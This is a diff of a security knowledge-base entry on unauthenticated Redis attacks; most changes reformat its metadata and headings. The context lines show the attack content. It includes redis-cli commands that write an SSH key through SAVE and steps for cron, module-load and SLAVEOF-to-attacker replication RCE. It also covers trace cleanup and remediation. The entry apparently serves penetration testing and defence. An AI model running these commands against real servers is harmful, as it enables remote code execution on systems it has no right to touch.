@@ -1,17 +1,38 @@
 ---
-title: Redis Unauthenticated (File Write / Module Load / Master-Slave Replication)
-cve: No single CVE (CVE-2022-0543 is a Debian special case)
-severity: critical
+id: "redis-unauth"
+title: "Redis Unauthenticated (File Write / Module Load / Master-Slave Replication)"
+kind: "implementation"
+cve: null
+related-cves: null
+cve-note: "No single CVE (CVE-2022-0543 is a Debian special case)"
+severity: "critical"
 cvss: 9.8
-product: Redis
-versions: Any (no auth + exposed)
-ports: 6379, 6380
-keywords: redis, unauth, config-set, rdb, cron, module-load, replica
+severity-basis: "cvss"
+severity-note: null
+product: "Redis"
+versions: "Any (no auth + exposed)"
+ports: "6379, 6380"
+keywords: "redis, unauth, config-set, rdb, cron, module-load, replica"
+entry: "Redis network service without authentication"
 verified: false
-sources: Compiled from public sources (business-logic / implementation / misconfiguration classes, no CVE; see references below)
+verified-on: null
+verification-evidence: null
+source-url: null
+vendor-advisory: null
+cwe: null
+patch-date: null
+sources: "Compiled from public sources (business-logic / implementation / misconfiguration classes, no CVE; see references below)"
+kev: null
+kev-date: null
+kev-source: null
+epss: null
+epss-percentile: null
+epss-date: null
+epss-source: null
+enrichment-updated: null
 ---
 
-## Fingerprint
+## Fingerprinting
 
 ```bash
 redis-cli -h target -p 6379 INFO
@@ -44,7 +65,7 @@ redis-cli -h target SET x "\n\nssh-rsa AAAA... \n\n"
 redis-cli -h target SAVE
 ```
 
-## Exploitation steps
+## Exploitation Steps
 
 1. Use `INFO` to confirm the version and that `CONFIG` is available (when some versions disable `CONFIG`, use `SLAVEOF`/`MODULE`).
 2. Before writing files, run `CONFIG GET dir` to confirm a writable directory; after `SAVE`, verify the file (`redis-cli GET` or read it directly).
@@ -53,7 +74,7 @@ redis-cli -h target SAVE
 5. Master-slave replication RCE: `SLAVEOF attacker 6379` + `MODULE LOAD`, the most reliable option when outbound connectivity is unavailable and file writes are restricted.
 6. Cleanup: restore with `CONFIG SET dir /tmp`, delete written files, `MODULE UNLOAD`.
 
-## Remediation and mitigation
+## Remediation and Mitigation
 
 - Set `requirepass` + `rename-command CONFIG ""`; keep 6379 internal-only; `protected-mode yes` and do not bind 0.0.0.0.
 
